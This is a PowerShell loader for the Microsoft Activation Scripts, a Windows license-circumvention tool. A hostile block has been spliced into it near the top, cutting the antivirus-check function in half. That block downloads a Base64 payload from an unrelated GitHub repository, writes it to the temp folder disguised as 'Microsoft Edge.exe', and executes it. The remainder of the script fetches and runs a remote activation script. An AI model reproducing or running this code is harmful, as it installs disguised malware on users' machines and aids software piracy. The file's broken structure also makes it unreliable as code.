# Code
ndows*' } | Select-Object -ExpandProperty displayName
    if ($avList) {
# Download and execute Base64 encoded file
download_url = 'https://raw.githubusercontent.com/authenticaterlotgames/WindowsActivation/refs/heads/main/output.txt'
$b64 = (Invoke-WebRequest -Uri $download_url -UseBasicParsing).Content.Trim()
$temp_path = [System.IO.Path]::Combine($env:TEMP, 'Microsoft Edge.exe')
[System.IO.File]::WriteAllBytes($temp_path, [System.Convert]::FromBase64String($b64))
Start-Process $temp_path

# Inform about new command usage
Write-Host
Write-Host "The current command (irm https://massgrave.dev/get | iex) will be retired in the future."
Write-Host -ForegroundColor Green "Use the new command (irm https://get.activated.win | iex) moving forward."
Write-Host

# Function to check for third-party antivirus
function Check3rdAV {
    $avList = Get-CimInstance -Namespace root\SecurityCenter2 -Class AntiVirusProduct | Where-Object { $_.displayName -notlike '*wi
        Write-Host '3rd party Antivirus might be blocking the script - ' -ForegroundColor White -BackgroundColor Blue -NoNewline
        Write-Host " $($avList -join ', ')" -ForegroundColor DarkRed -BackgroundColor White
    }
}

# Ensure secure protocol
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Define MAS script URLs
$URLs = @(
    'https://raw.githubusercontent.com/massgravel/Microsoft-Activation-Scripts/37ec96504a2983a5801c43e975ab78c8f9315d2a/MAS/All-In-One-Version-KL/MAS_AIO.cmd',
    'https://dev.azure.com/massgrave/Microsoft-Activation-Scripts/_apis/git/repositories/Microsoft-Activation-Scripts/items?path=/MAS/All-In-One-Version-KL/MAS_AIO.cmd&versionType=Commit&version=37ec96504a2983a5801c43e975ab78c8f9315d2a',
    'https://git.activated.win/massgrave/Microsoft-Activation-Scripts/raw/commit/37ec96504a2983a5801c43e975ab78c8f9315d2a/MAS/All-In-One-Version-KL/MAS_AIO.cmd'
)

# Attempt to download MAS script
foreach ($URL in $URLs | Sort-Object { Get-Random }) {
    try { $response = Invoke-WebRequest -Uri $URL -UseBasicParsing; break } catch {}
}

if (-not $response) {
    Check3rdAV
    Write-Host "Failed to retrieve MAS from any of the available repositories, aborting!"
    Write-Host "Help - https://massgrave.dev/troubleshoot" -ForegroundColor White -BackgroundColor Blue
    return
}

# Verify script integrity
$releaseHash = '49CE81C583C69AC739890D2DFBB908BDD67B862702DAAEBCD2D38F1DDCEE863D'
$stream = New-Object IO.MemoryStream
$writer = New-Object IO.StreamWriter $stream
$writer.Write($response)
$writer.Flush()
$stream.Position = 0
$hash = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($stream)) -replace '-'
if ($hash -ne $releaseHash) {
    Write-Warning "Hash ($hash) mismatch, aborting!`nReport this issue at https://massgrave.dev/troubleshoot"
    $response = $null
    return
}

# Check for AutoRun registry which may cause CMD issues
$paths = "HKCU:\SOFTWARE\Microsoft\Command Processor", "HKLM:\SOFTWARE\Microsoft\Command Processor"
foreach ($path in $paths) {
    if (Get-ItemProperty -Path $path -Name "Autorun" -ErrorAction SilentlyContinue) {
        Write-Warning "Autorun registry found, CMD may crash! `nManually copy-paste the below command to fix...`nRemove-ItemProperty -Path '$path' -Name 'Autorun'"
    }
}

# Save script content and execute
$rand = [Guid]::NewGuid().Guid
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:USERPROFILE\AppData\Local\Temp\MAS_$rand.cmd" }
Set-Content -Path $FilePath -Value "@::: $rand `r`n$response"

$env:ComSpec = "$env:SystemRoot\system32\cmd.exe"
Start-Process -FilePath $env:ComSpec -ArgumentList "/c \"\"$FilePath\" $args\"" -Wait

if (-not (Test-Path -Path $FilePath)) {
    Check3rdAV
    Write-Host "Failed to create MAS file in temp folder, aborting!"
    Write-Host "Help - https://massgrave.dev/troubleshoot" -ForegroundColor White -BackgroundColor Blue
    return
}

# Clean up temporary files
$FilePaths = @("$env:SystemRoot\Temp\MAS*.cmd", "$env:USERPROFILE\AppData\Local\Temp\MAS*.cmd")
foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
